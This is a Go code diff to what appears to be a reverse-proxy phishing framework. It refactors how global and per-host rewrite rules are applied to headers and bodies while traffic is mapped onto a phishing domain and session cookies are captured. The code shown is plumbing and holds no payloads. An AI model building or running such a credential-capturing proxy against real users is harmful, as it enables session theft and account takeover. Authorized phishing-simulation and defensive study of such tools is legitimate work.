@@ -539,46 +539,14 @@ func (m *ProxyHandler) prepareRequestWithoutSession(req *http.Request, reqCtx *R
 		}
 	}
 
-	// append global rewrite rules to host config for requests without session
+	// note: header rewrite rules are already applied in applyEarlyRequestHeaderReplacements
+
+	// apply body rewrite rules (no capture)
+	// append global rewrite rules to host config for body replacements
 	if reqCtx.ProxyConfig != nil && reqCtx.ProxyConfig.Global != nil && reqCtx.ProxyConfig.Global.Rewrite != nil {
 		hostConfig.Rewrite = append(hostConfig.Rewrite, reqCtx.ProxyConfig.Global.Rewrite...)
 	}
 
-	// apply header rewrite rules (no capture)
-	if hostConfig.Rewrite != nil {
-		for _, replacement := range hostConfig.Rewrite {
-			if replacement.From == "" || replacement.From == "request_header" || replacement.From == "any" {
-				engine := replacement.Engine
-				if engine == "" {
-					engine = "regex"
-				}
-				if engine == "regex" {
-					re, err := regexp.Compile(replacement.Find)
-					if err != nil {
-						continue
-					}
-					for headerName, values := range req.Header {
-						newValues := make([]string, 0, len(values))
-						for _, val := range values {
-							fullHeader := headerName + ": " + val
-							replaced := re.ReplaceAllString(fullHeader, replacement.Replace)
-							if strings.HasPrefix(replaced, headerName+": ") {
-								newVal := replaced[len(headerName)+2:]
-								newValues = append(newValues, newVal)
-							} else if replaced != fullHeader {
-								newValues = append(newValues, val)
-							} else {
-								newValues = append(newValues, val)
-							}
-						}
-						req.Header[headerName] = newValues
-					}
-				}
-			}
-		}
-	}
-
-	// apply body rewrite rules (no capture)
 	if req.Body != nil {
 		body, err := io.ReadAll(req.Body)
 		if err == nil {
@@ -1034,7 +1002,7 @@ func (m *ProxyHandler) rewriteResponseBodyWithContext(resp *http.Response, reqCt
 
 	// build variables context for template interpolation
 	varCtx := m.buildVariablesContext(resp.Request.Context(), reqCtx.Session, reqCtx.ProxyConfig)
-	body = m.applyCustomReplacementsWithVariables(body, reqCtx.Session, varCtx, contentType)
+	body = m.applyCustomReplacementsWithVariables(body, reqCtx.Session, reqCtx.TargetDomain, reqCtx.ProxyConfig, varCtx, contentType)
 
 	// apply obfuscation if enabled
 	if reqCtx.Campaign != nil && strings.Contains(contentType, "text/html") {
@@ -1117,14 +1085,13 @@ func (m *ProxyHandler) createMinimalConfig(phishDomain, targetDomain string) map
 		config[targetDomain] = service.ProxyServiceDomainConfig{To: phishDomain}
 	}
 
-	// add global rules to all host configurations
+	// add global capture rules to all host configurations
+	// note: global rewrite rules are applied separately in applyCustomReplacementsWithoutSession
 	if fullConfigYAML != nil && fullConfigYAML.Global != nil {
 		for originalHost := range config {
 			hostConfig := config[originalHost]
 			// append global capture rules
 			hostConfig.Capture = append(hostConfig.Capture, fullConfigYAML.Global.Capture...)
-			// append global rewrite rules
-			hostConfig.Rewrite = append(hostConfig.Rewrite, fullConfigYAML.Global.Rewrite...)
 			config[originalHost] = hostConfig
 		}
 	}
@@ -1175,7 +1142,7 @@ func (m *ProxyHandler) rewriteResponseBodyWithoutSessionContext(resp *http.Respo
 
 	body = m.patchUrls(configMap, body, CONVERT_TO_PHISHING_URLS)
 	body = m.applyURLPathRewritesWithoutSession(body, reqCtx)
-	body = m.applyCustomReplacementsWithoutSession(body, configMap, reqCtx.TargetDomain, contentType)
+	body = m.applyCustomReplacementsWithoutSession(body, configMap, reqCtx.TargetDomain, reqCtx.ProxyConfig, contentType)
 
 	// apply obfuscation if enabled
 	if reqCtx.Campaign != nil && strings.Contains(contentType, "text/html") {
@@ -1412,13 +1379,12 @@ func (m *ProxyHandler) buildSessionConfig(targetDomain, phishDomain string, prox
 		}
 	}
 
-	// add global rules only to the target domain configuration
+	// add global capture rules only to the target domain configuration
+	// note: global rewrite rules are applied separately in applyCustomReplacementsWithVariables
 	if proxyConfig.Global != nil && sessionConfig[targetDomain].To != "" {
 		hostConfig := sessionConfig[targetDomain]
 		// append global capture rules
 		hostConfig.Capture = append(hostConfig.Capture, proxyConfig.Global.Capture...)
-		// append global rewrite rules
-		hostConfig.Rewrite = append(hostConfig.Rewrite, proxyConfig.Global.Rewrite...)
 		sessionConfig[targetDomain] = hostConfig
 	}
 
@@ -1494,7 +1460,7 @@ func (m *ProxyHandler) onRequestBody(req *http.Request, session *service.ProxySe
 
 	// build variables context using the proxy config passed from caller
 	varCtx := m.buildVariablesContext(req.Context(), session, proxyConfig)
-	m.applyRequestBodyReplacementsWithVariables(req, session, varCtx)
+	m.applyRequestBodyReplacementsWithVariables(req, session, proxyConfig, varCtx)
 }
 
 func (m *ProxyHandler) onRequestHeader(req *http.Request, session *service.ProxySession) {
@@ -2342,18 +2308,18 @@ func (m *ProxyHandler) createCookieBundle(cookieCaptures map[string]map[string]s
 	return bundledData
 }
 
-func (m *ProxyHandler) applyRequestBodyReplacements(req *http.Request, session *service.ProxySession) {
-	m.applyRequestBodyReplacementsWithVariables(req, session, nil)
+func (m *ProxyHandler) applyRequestBodyReplacements(req *http.Request, session *service.ProxySession, proxyConfig *service.ProxyServiceConfigYAML) {
+	m.applyRequestBodyReplacementsWithVariables(req, session, proxyConfig, nil)
 }
 
-func (m *ProxyHandler) applyRequestBodyReplacementsWithVariables(req *http.Request, session *service.ProxySession, varCtx *VariablesContext) {
+func (m *ProxyHandler) applyRequestBodyReplacementsWithVariables(req *http.Request, session *service.ProxySession, proxyConfig *service.ProxyServiceConfigYAML, varCtx *VariablesContext) {
 	if req.Body == nil {
 		return
 	}
 
 	body := m.readRequestBody(req)
 
-	// only apply rewrite rules for the current host
+	// apply rewrite rules for the current host
 	if hostConfig, ok := session.Config.Load(req.Host); ok {
 		hCfg := hostConfig.(service.ProxyServiceDomainConfig)
 		if hCfg.Rewrite != nil {
@@ -2365,16 +2331,25 @@ func (m *ProxyHandler) applyRequestBodyReplacementsWithVariables(req *http.Reque
 		}
 	}
 
+	// apply global rewrite rules
+	if proxyConfig != nil && proxyConfig.Global != nil && proxyConfig.Global.Rewrite != nil {
+		for _, replacement := range proxyConfig.Global.Rewrite {
+			if replacement.From == "" || replacement.From == "request_body" || replacement.From == "any" {
+				body = m.applyReplacementWithVariables(body, replacement, session.ID, varCtx, "")
+			}
+		}
+	}
+
 	req.Body = io.NopCloser(bytes.NewBuffer(body))
 }
 
-func (m *ProxyHandler) applyCustomReplacements(body []byte, session *service.ProxySession) []byte {
-	return m.applyCustomReplacementsWithVariables(body, session, nil, "")
+func (m *ProxyHandler) applyCustomReplacements(body []byte, session *service.ProxySession, targetDomain string, proxyConfig *service.ProxyServiceConfigYAML) []byte {
+	return m.applyCustomReplacementsWithVariables(body, session, targetDomain, proxyConfig, nil, "")
 }
 
-func (m *ProxyHandler) applyCustomReplacementsWithVariables(body []byte, session *service.ProxySession, varCtx *VariablesContext, contentType string) []byte {
-	// only apply rewrite rules for the current host
-	if hostConfig, ok := session.Config.Load(session.TargetDomain); ok {
+func (m *ProxyHandler) applyCustomReplacementsWithVariables(body []byte, session *service.ProxySession, targetDomain string, proxyConfig *service.ProxyServiceConfigYAML, varCtx *VariablesContext, contentType string) []byte {
+	// apply rewrite rules for the current request's target domain
+	if hostConfig, ok := session.Config.Load(targetDomain); ok {
 		hCfg := hostConfig.(service.ProxyServiceDomainConfig)
 		if hCfg.Rewrite != nil {
 			for _, replacement := range hCfg.Rewrite {
@@ -2384,18 +2359,37 @@ func (m *ProxyHandler) applyCustomReplacementsWithVariables(body []byte, session
 			}
 		}
 	}
+
+	// apply global rewrite rules
+	if proxyConfig != nil && proxyConfig.Global != nil && proxyConfig.Global.Rewrite != nil {
+		for _, replacement := range proxyConfig.Global.Rewrite {
+			if replacement.From == "" || replacement.From == "response_body" || replacement.From == "any" {
+				body = m.applyReplacementWithVariables(body, replacement, session.ID, varCtx, contentType)
+			}
+		}
+	}
+
 	return body
 }
 
 // applyCustomReplacementsWithoutSession applies rewrite rules for requests without session context
-func (m *ProxyHandler) applyCustomReplacementsWithoutSession(body []byte, config map[string]service.ProxyServiceDomainConfig, targetDomain string, contentType string) []byte {
-	// apply rewrite rules from all host configurations (matches session behavior)
-	for _, hostConfig := range config {
+func (m *ProxyHandler) applyCustomReplacementsWithoutSession(body []byte, config map[string]service.ProxyServiceDomainConfig, targetDomain string, proxyConfig *service.ProxyServiceConfigYAML, contentType string) []byte {
+	// apply rewrite rules for the current target domain
+	if hostConfig, ok := config[targetDomain]; ok {
 		if hostConfig.Rewrite != nil {
 			for _, replacement := range hostConfig.Rewrite {
 				if replacement.From == "" || replacement.From == "response_body" || replacement.From == "any" {
 					body = m.applyReplacement(body, replacement, "no-session", contentType)
 				}
+			}
+		}
+	}
+
+	// apply global rewrite rules
+	if proxyConfig != nil && proxyConfig.Global != nil && proxyConfig.Global.Rewrite != nil {
+		for _, replacement := range proxyConfig.Global.Rewrite {
+			if replacement.From == "" || replacement.From == "response_body" || replacement.From == "any" {
+				body = m.applyReplacement(body, replacement, "no-session", contentType)
 			}
 		}
 	}
@@ -2887,13 +2881,10 @@ func (m *ProxyHandler) applyEarlyRequestHeaderReplacements(req *http.Request, re
 		applyReplacements(reqCtx.ProxyConfig.Global.Rewrite)
 	}
 
-	// then apply request_header replacements from all host configs
-	// this ensures replacements work for all domains in the session (e.g., CDN domains)
+	// apply request_header replacements only for the current target domain
 	if reqCtx.ProxyConfig.Hosts != nil {
-		for _, domainConfig := range reqCtx.ProxyConfig.Hosts {
-			if domainConfig != nil && domainConfig.Rewrite != nil {
-				applyReplacements(domainConfig.Rewrite)
-			}
+		if domainConfig, exists := reqCtx.ProxyConfig.Hosts[reqCtx.TargetDomain]; exists && domainConfig != nil && domainConfig.Rewrite != nil {
+			applyReplacements(domainConfig.Rewrite)
 		}
 	}
 }
